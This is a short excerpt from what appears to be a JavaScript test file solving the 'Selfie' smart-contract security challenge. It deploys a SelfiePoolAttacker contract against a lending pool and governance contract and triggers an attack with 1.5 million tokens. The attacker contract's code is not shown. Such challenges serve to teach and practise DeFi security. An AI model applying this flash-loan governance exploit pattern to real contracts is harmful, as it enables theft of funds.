...
describe('[Challenge] Selfie', function () {
    ...
    it('Execution', async function () {
        ...
        const SelfiePoolAttacker = await ethers.getContractFactory('SelfiePoolAttacker', player);
        const attacker = await SelfiePoolAttacker.deploy(pool.address, governance.address, player.address);

        await attacker.attack(ethers.utils.parseEther("1500000"));
